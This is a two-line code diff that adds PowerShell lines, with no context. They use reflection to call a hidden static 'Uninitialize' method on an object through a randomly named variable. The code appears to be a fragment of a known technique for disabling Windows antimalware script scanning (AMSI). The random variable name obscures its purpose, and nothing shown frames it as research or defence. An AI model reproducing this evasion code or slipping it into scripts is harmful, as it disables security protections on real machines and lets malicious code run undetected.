@@ -1,0 +1,2 @@
+$kweFRFOronwxKKpJUoTKgqlSAnNxnbzCBzzeQVyTCZz = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
+$kweFRFOronwxKKpJUoTKgqlSAnNxnbzCBzzeQVyTCZz.Invoke($object,$null)
